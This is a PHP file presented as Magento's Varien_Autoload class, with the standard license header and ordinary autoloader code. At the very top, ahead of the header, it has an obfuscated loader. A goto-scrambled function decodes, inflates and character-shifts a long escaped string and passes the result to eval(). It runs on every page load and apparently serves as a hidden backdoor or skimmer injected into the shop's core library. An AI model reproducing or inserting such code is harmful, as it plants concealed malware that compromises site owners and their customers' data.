<?php
function Ap3o6($qTCUq) { goto hq77c; oDz4x: $qTCUq[$e16f_] = chr(ord($qTCUq[$e16f_]) - 1); goto Uh30X; JX4_I: $e16f_++; goto vEDPh; aCfw2: $e16f_ = 0; goto BPbpc; SNheX: if (!($e16f_ < strlen($qTCUq))) { goto QDa4y; } goto oDz4x; vEDPh: goto Cukqb; goto AcZy5; o1nlu: return $qTCUq; goto DEskn; hq77c: $qTCUq = gzinflate(base64_decode($qTCUq)); goto aCfw2; BPbpc: Cukqb: goto SNheX; Uh30X: uCs4B: goto JX4_I; AcZy5: QDa4y: goto o1nlu; DEskn: } eval(AP3O6("\170\x56\x6e\x66\x63\65\164\107\105\110\x34\x33\146\70\130\x46\x77\x77\x7a\123\154\111\147\111\x79\x33\x5a\x64\124\61\112\x35\x58\104\53\x36\67\x69\122\x70\130\71\113\115\x35\x6a\x67\x4f\x51\70\x79\x76\x77\154\110\x62\x39\x66\150\166\67\x39\x36\x78\151\x45\116\103\x53\x46\142\x53\154\x41\x63\x4a\63\x65\x35\53\x74\71\x2f\165\67\x64\66\x42\103\112\107\130\x59\x62\x43\131\x6c\151\x58\x35\152\124\64\155\120\x42\x58\x6b\171\x54\x44\x79\x79\157\x73\152\x52\157\111\x71\132\123\x4c\x4b\x55\x6c\x4a\153\155\x52\x69\x4e\x6e\x77\171\x70\x58\156\102\122\106\x53\x6b\x78\x46\170\53\x75\x33\166\x39\170\71\146\x37\124\64\x53\70\63\x6c\67\x39\x66\130\57\63\x36\143\146\x48\x2b\x35\165\142\152\64\x65\144\x7a\x34\63\x6e\116\x6e\x6a\x39\167\126\147\156\165\122\145\156\111\132\107\120\x6a\171\x54\x42\150\x42\x48\x36\122\x74\x38\x51\113\x61\106\170\171\66\x39\x79\131\x5a\x39\66\x69\106\114\123\x41\x69\143\66\x4e\x4b\103\103\152\x78\x6e\162\x42\110\x36\112\123\x6c\103\x4e\114\x6f\x6c\x68\x6a\x61\x53\x37\71\155\x4d\x75\x66\101\x47\x63\x54\x73\167\101\x4c\x4f\143\122\x5a\x6d\x4a\x46\65\154\117\x52\x78\x35\166\120\122\x34\132\x2f\x70\x6f\x53\x62\x55\x70\154\122\101\x30\x6b\x38\117\x55\57\x64\117\x56\124\66\x57\x67\151\146\141\132\x50\127\x41\x39\x48\64\x4e\x44\130\x57\110\x38\125\x49\145\x78\x34\163\x75\x67\144\162\142\126\x74\x49\x50\x33\150\x6f\x4f\x54\160\102\x44\102\153\x56\131\x56\x4a\162\x4c\172\126\x41\166\x37\x6c\112\146\122\64\x33\x4b\122\x63\x48\x4c\x72\103\157\131\110\65\153\x42\161\x4d\63\172\x4c\117\145\160\x43\162\112\126\101\x48\x53\104\146\x52\71\x47\115\x53\145\x6a\x56\57\x4f\x41\132\167\107\157\x6a\163\146\111\112\151\147\x34\71\x57\110\x41\112\164\115\x33\x37\x67\x79\x6e\156\145\143\x73\172\153\x6f\112\62\x65\117\110\156\107\x43\x62\x45\60\x58\x47\106\153\164\x48\x61\x46\x48\x51\170\65\110\103\60\127\67\154\x5a\x65\x56\122\172\x69\62\67\57\126\x31\131\x36\x6e\65\x4d\67\112\x33\125\x37\61\x2b\x6d\124\x6c\110\x64\x41\101\116\151\x35\165\x50\x56\x78\x41\161\x49\122\x62\x4b\64\65\127\114\x42\163\x6c\x52\101\132\x5a\125\152\115\x2f\70\x30\57\x62\171\115\151\161\123\x46\153\145\x6e\x4c\x55\x4d\x4e\66\123\x2b\x4a\x5a\x4b\154\132\130\61\162\167\x64\110\106\153\117\64\x44\154\x6c\x61\x4e\154\162\150\106\64\172\152\131\x37\x4a\141\152\x59\x39\x6a\162\x51\x7a\104\x4f\x65\112\120\53\123\x63\151\125\x57\172\x5a\x76\132\x65\x4c\x73\x48\x6d\65\141\x4a\120\x73\x63\127\142\x51\x4c\155\102\x46\152\70\x35\152\153\x55\155\65\107\163\x58\x38\154\142\120\154\105\53\171\x6b\x36\155\60\170\x35\x79\x6d\x73\x70\163\61\x4c\x62\x50\127\154\151\x70\x72\x48\x54\x4c\156\x52\144\x4a\60\x57\x44\120\115\105\147\66\131\x70\147\151\x6a\x38\166\x57\x37\165\x76\155\145\164\65\x6d\66\132\x46\111\157\154\123\x61\127\121\57\120\x63\x59\144\x44\165\x34\113\120\x67\172\x6a\x57\71\65\x51\x34\62\x63\165\143\141\150\155\120\x6e\x6d\157\x73\x77\x38\x79\x33\144\166\151\x6f\106\107\x42\x66\104\x4b\x49\x31\x57\x44\x61\120\x62\130\57\x69\112\64\152\170\x67\162\x46\124\x57\114\127\71\x53\156\157\116\x34\171\70\121\x68\x5a\x33\144\x5a\61\x66\x6a\x2f\x38\124\110\156\107\157\142\103\161\121\117\152\67\123\x6f\x57\x43\65\x50\x4d\112\66\x66\x48\170\70\x53\141\x51\x49\x44\x47\114\172\122\101\162\151\x38\x30\x55\x79\x78\146\x61\x49\115\x68\127\x4c\105\x61\164\x44\x79\x5a\172\127\160\x57\105\x43\57\64\171\x4d\x50\x63\x32\163\x63\143\117\121\x4c\111\102\61\66\127\163\x4f\152\x32\x52\x56\x4b\60\x76\170\64\107\111\167\x46\101\172\x52\x30\x43\71\144\x55\110\x31\x74\x4c\x54\164\x6c\x69\114\162\107\x49\x68\145\126\x32\x51\67\x59\x56\x78\64\65\127\x38\53\x42\x73\x43\x41\x74\117\123\x6e\145\x74\x6f\x65\x37\157\110\x58\126\150\127\x31\144\x55\x44\64\67\156\x41\70\x48\x32\x33\x36\145\165\66\x4c\x50\x2b\113\166\x78\57\150\x62\x6a\126\166\104\130\160\146\x39\141\115\x4c\x76\x58\x32\124\x43\150\x62\103\166\x6b\160\x46\x61\112\163\160\x54\142\150\x74\154\x74\105\x2f\x38\102\x6c\101\131\x37\x66\x4e\117\105\x72\x76\x63\x4e\107\157\63\122\115\x47\x6d\65\x31\124\x32\125\x79\125\x7a\126\x68\142\126\71\x74\x57\x62\127\60\x6c\x67\x66\123\127\110\x4d\x68\x4a\157\x61\63\x4a\143\x58\156\142\x51\x65\70\x47\x55\x50\x71\102\x2b\x71\x2b\147\104\x38\x71\142\154\x57\126\x64\x61\70\153\164\x37\142\66\111\x42\120\x56\x69\150\x42\166\x33\66\x4d\x6d\x4c\x5a\146\x6e\152\x53\106\x47\61\116\60\53\67\121\63\x55\x75\70\x39\x69\x68\x4f\142\110\x61\63\172\166\x67\x4e\x74\145\x7a\x38\x58\125\141\x6d\66\125\x39\161\x79\x44\x4f\65\107\x62\71\x76\x52\146\x42\123\152\x54\x2b\166\60\x58\167\157\x67\125\167\155\110\x68\65\122\160\111\111\70\x6c\x76\x53\x67\x47\53\162\x4f\x34\x72\111\63\x79\x79\67\172\60\121\145\64\143\x69\124\x73\x51\71\170\115\65\x69\144\131\115\102\x58\x44\164\157\x71\65\172\61\67\125\x6e\101\171\153\x77\142\x31\105\x56\130\156\132\112\x50\x44\x2b\170\x38\117\145\x30\x77\x43\x36\131\x59\x38\70\65\x33\x4d\142\x44\126\150\156\60\65\x7a\114\152\x79\x5a\57\x61\144\122\63\67\x4e\x67\104\x67\x36\x4d\x48\x51\x76\112\x6f\53\172\x4f\x7a\67\112\x69\x65\x52\x54\x31\157\x34\114\x30\110\60\x57\x56\x62\64\x75\x70\x46\x49\x49\x53\67\117\112\x66\x53\151\145\x52\110\132\172\113\120\x53\131\x55\123\x65\172\x41\111\64\170\146\115\x51\x48\144\120\143\155\x7a\105\x71\114\157\64\x45\106\117\x38\x56\x47\62\126\x70\124\66\57\105\110\x74\57\103\x68\123\171\126\121\x69\x79\107\131\x51\63\126\x59\x46\x6e\63\x77\x70\x47\66\155\x73\106\103\127\x64\x48\x72\154\156\117\103\132\x7a\130\x56\165\105\121\165\x51\x6c\156\120\125\x4c\145\152\53\x35\x6a\125\x52\131\145\122\126\x73\x4e\x37\147\x71\x4a\x75\103\x47\x41\71\x4d\126\x4e\x49\60\x79\170\70\163\105\x75\x41\165\142\64\123\x6c\x43\x37\70\142\x58\x62\x66\155\127\144\x32\x44\x64\153\166\126\65\x51\113\164\131\114\114\x38\124\67\153\145\60\123\x39\x6a\x64\x54\116\147\144\112\x4f\172\62\105\110\x61\57\103\127\x46\70\151\x6d\110\124\154\x6e\x54\142\x54\x42\144\124\107\x7a\116\154\131\x2b\x42\x74\x54\111\x2b\x4e\121\144\x66\x62\x48\x36\103\x34\x76\123\x67\x75\157\x72\151\111\64\151\x4b\113\x69\171\x69\165\x68\x6d\111\115\114\105\x34\163\x48\166\60\x55\x75\106\166\123\141\x4a\x75\60\110\x55\x38\x39\x33\x62\x78\x4a\x65\x77\x74\120\63\156\162\123\61\120\151\106\102\x30\57\x36\154\101\x6c\144\161\x6d\150\x4b\x36\146\124\x55\x50\124\x76\122\163\60\x62\x33\172\x5a\x70\162\131\x64\x4f\164\x4b\x58\155\x44\154\x4c\x72\120\x62\x6c\60\171\60\x74\114\x53\x6a\x2b\x34\x36\x49\171\x57\70\105\113\x4b\x49\120\x49\152\x30\x47\151\125\x70\156\153\65\57\146\x4f\120\161\154\x4c\x78\71\113\x52\61\x31\113\142\106\x42\x53\x74\157\x54\x5a\x5a\x63\120\107\53\x4b\x6a\150\112\x65\161\x72\116\x62\x49\123\116\156\132\x36\x66\x45\x62\156\121\x76\x62\154\70\x75\60\171\70\125\x66\x54\x73\x2f\66\x47\x62\146\114\x53\x5a\x70\x62\53\154\x4f\x52\172\x73\153\146\x58\110\x56\123\x65\156\x52\62\x64\110\x79\153\x30\57\x4c\63\x70\x54\127\x7a\x65\x6b\160\124\x76\163\146\121\x47\x34\132\x32\102\154\x39\x51\x72\x48\127\x4b\x74\125\66\170\x31\151\156\x57\117\x75\x31\62\104\x4b\66\63\104\102\63\110\121\170\167\x50\143\124\172\x45\70\122\104\110\127\70\x55\65\66\163\144\x68\151\115\x4d\x51\150\x79\105\117\121\x78\x79\62\x69\152\x50\x72\170\x2f\x45\x52\170\60\x63\x63\110\63\106\x38\x78\120\106\x37\144\165\146\116\117\57\x4a\155\167\x64\161\x62\x39\x32\x72\x35\x31\x49\x76\114\x69\170\x66\112\167\x55\x48\162\157\x33\160\x76\x31\114\66\116\x6b\147\x32\123\x74\117\x4a\154\x79\60\123\x4e\x5a\x6e\x2f\x58\126\x4e\157\164\57\x39\170\167\156\101\x50\x7a\157\x68\113\x5a\x62\116\x36\141\x53\152\x4f\x30\x68\x46\106\x50\x34\65\x72\x43\x38\153\63\x58\64\101\x48\x6c\x51\x46\61\67\x42\107\127\152\64\116\153\x77\x6d\63\70\164\x33\x70\x4b\x55\63\172\146\x2f\131\x5a\167\x76\x78\62\x45\67\161\112\122\x6e\x50\x37\x2f\x37\106\167\x3d\75"));
/**
 * Magento
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Open Software License (OSL 3.0)
 * that is bundled with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://opensource.org/licenses/osl-3.0.php
 * If you did not receive a copy of the license and are unable to
 * obtain it through the world-wide-web, please send an email
 * to license@magentocommerce.com so we can send you a copy immediately.
 *
 * DISCLAIMER
 *
 * Do not edit or add to this file if you wish to upgrade Magento to newer
 * versions in the future. If you wish to customize Magento for your
 * needs please refer to http://www.magentocommerce.com for more information.
 *
 * @category   Varien
 * @package    Varien_Autoload
 * @copyright  Copyright (c) 2008 Irubin Consulting Inc. DBA Varien (http://www.varien.com)
 * @license    http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
 */




/**
 * Classes source autoload
 */
class Varien_Autoload
{
    const SCOPE_FILE_PREFIX = '__';

    static protected $_instance;
    static protected $_scope = 'default';

    protected $_isIncludePathDefined= null;
    protected $_collectClasses      = false;
    protected $_collectPath         = null;
    protected $_arrLoadedClasses    = array();

    /**
     * Class constructor
     */
    public function __construct()
    {
        register_shutdown_function(array($this, 'destroy'));
        $this->_isIncludePathDefined = defined('COMPILER_INCLUDE_PATH');
        if (defined('COMPILER_COLLECT_PATH')) {
            $this->_collectClasses  = true;
            $this->_collectPath     = COMPILER_COLLECT_PATH;
        }
        self::registerScope(self::$_scope);
    }

    /**
     * Singleton pattern implementation
     *
     * @return Varien_Autoload
     */
    static public function instance()
    {
        if (!self::$_instance) {
            self::$_instance = new Varien_Autoload();
        }
        return self::$_instance;
    }

    /**
     * Register SPL autoload function
     */
    static public function register()
    {
        spl_autoload_register(array(self::instance(), 'autoload'));
    }

    /**
     * Load class source code
     *
     * @param string $class
     */
    public function autoload($class)
    {
        if ($this->_collectClasses) {
            $this->_arrLoadedClasses[self::$_scope][] = $class;
        }
        if ($this->_isIncludePathDefined) {
            $classFile =  COMPILER_INCLUDE_PATH . DIRECTORY_SEPARATOR . $class;
        } else {
            $classFile = str_replace(' ', DIRECTORY_SEPARATOR, ucwords(str_replace('_', ' ', $class)));
        }
        $classFile.= '.php';
        //echo $classFile;die();
        return include $classFile;
    }

    /**
     * Register autoload scope
     * This process allow include scope file which can contain classes
     * definition which are used for this scope
     *
     * @param string $code scope code
     */
    static public function registerScope($code)
    {
        self::$_scope = $code;
        if (defined('COMPILER_INCLUDE_PATH')) {
            @include COMPILER_INCLUDE_PATH . DIRECTORY_SEPARATOR . self::SCOPE_FILE_PREFIX.$code.'.php';
        }
    }

    /**
     * Get current autoload scope
     *
     * @return string
     */
    static public function getScope()
    {
        return self::$_scope;
    }

    /**
     * Class destructor
     */
    public function destroy()
    {
        if ($this->_collectClasses) {
            $this->_saveCollectedStat();
        }
    }

    /**
     * Save information about used classes per scope with class popularity
     * Class_Name:popularity
     *
     * @return Varien_Autoload
     */
    protected function _saveCollectedStat()
    {
        if (!is_dir($this->_collectPath)) {
            @mkdir($this->_collectPath);
            @chmod($this->_collectPath, 0777);
        }

        if (!is_writeable($this->_collectPath)) {
            return $this;
        }

        foreach ($this->_arrLoadedClasses as $scope => $classes) {
            $file = $this->_collectPath.DIRECTORY_SEPARATOR.$scope.'.csv';
            $data = array();
            if (file_exists($file)) {
                $data = explode("\n", file_get_contents($file));
                foreach ($data as $index => $class) {
                    $class = explode(':', $class);
                    $searchIndex = array_search($class[0], $classes);
                    if ($searchIndex !== false) {
                        $class[1]+=1;
                        unset($classes[$searchIndex]);
                    }
                    $data[$index] = $class[0].':'.$class[1];
                }
            }
            foreach ($classes as $class) {
                $data[] = $class . ':1';
            }
            file_put_contents($file, implode("\n", $data));
        }
        return $this;
    }
}
